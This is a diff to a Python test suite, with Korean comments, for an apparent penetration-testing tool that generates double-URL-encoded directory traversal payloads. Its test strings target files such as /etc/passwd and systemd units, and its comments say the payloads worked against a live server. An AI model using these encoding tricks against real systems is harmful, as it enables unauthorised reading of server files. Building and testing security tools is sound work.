@@ -17,7 +17,12 @@ T = Target(1, "t", "https://sesacedu.store")
 # ── 인코딩 ────────────────────────────────────────────────────
 
 def test_double_full_matches_the_payload_that_worked():
-    """11-03 실측에 썼던 그 형태와 글자까지 같아야 한다."""
+    """11-03 실측 스크립트와 글자까지 같아야 한다 — 경로 구분자를 그대로 두는 쪽.
+
+    실측 형태는 두 가지였다. 사용자가 쓴 스크립트는 `$PRE` + `etc/systemd/...` 처럼
+    슬래시를 생짜로 두고, 다른 기록은 슬래시까지 %25%32%66 으로 감쌌다.
+    디코딩 결과가 같아 양쪽 다 통한다. 여기서 맞추는 것은 **앞쪽 형태**다.
+    """
     u = "%25%32%65%25%32%65%25%32%66"
     assert payloads.traversal("etc/passwd", 9, "double-full") == u * 9 + "etc/passwd"
 
@@ -488,3 +493,44 @@ def test_clicking_drill_button_works_end_to_end(app, tool_client):
     raw = _drill_values(html)[0]
     r = tool_client.post("/tools/run", data={**form, "_drill": _h.unescape(raw)})
     assert r.status_code == 200
+
+
+# ── 쿼리스트링에서 뜻이 달라지는 글자 ────────────────────────────
+# 경로에 '+' 가 있으면 서버가 공백으로 읽어 **있는 파일이 404 로 돌아온다.**
+# 모의해킹 세션이 11-04 실서버에서 /opt/java/jdk-11.0.24+8 로 확인했다.
+
+def test_plus_in_a_path_is_wrapped():
+    got = payloads.traversal("opt/java/jdk-11.0.24+8", 1, "double-full")
+    assert "+" not in got, "'+' 를 그대로 보내면 서버가 공백으로 읽는다"
+    assert got.endswith("opt/java/jdk-11.0.24%25%32%628")
+
+
+@pytest.mark.parametrize("ch", list(payloads.UNSAFE_IN_QUERY))
+def test_every_unsafe_char_is_wrapped(ch):
+    got = payloads.traversal(f"a{ch}b", 0, "url")
+    assert got == "a" + payloads._pct(ch) + "b"
+    if ch != "%":          # % 는 감싸면 %25 라 자기 자신이 남는다
+        assert ch not in got
+
+
+def test_ordinary_characters_are_left_alone():
+    """슬래시·점·글자는 그대로 둔다 — 실측 스크립트가 그 형태다."""
+    assert payloads.traversal("etc/systemd/system/x.service", 0, "double-full")         == "etc/systemd/system/x.service"
+
+
+@pytest.mark.parametrize("scheme", ["none", "dots"])
+def test_unwrapped_schemes_do_not_touch_the_path(scheme):
+    """감싸지 않는 방식은 경로도 건드리지 않는다 — 사람이 적은 그대로 보낸다."""
+    assert payloads.traversal("a+b", 0, scheme) == "a+b"
+
+
+def test_wrapping_depth_matches_the_dots():
+    """경로를 감싸는 겹수는 ../ 와 같아야 한다.
+
+    서버가 '../ 제거 → 디코딩' 순서라, 한 겹만 감싸면 제거 단계에서 이미 풀려
+    경로가 어긋난다.
+    """
+    one = payloads.traversal("a+b", 0, "url")
+    two = payloads.traversal("a+b", 0, "double-full")
+    assert one == "a%2bb"
+    assert two == "a%25%32%62b"
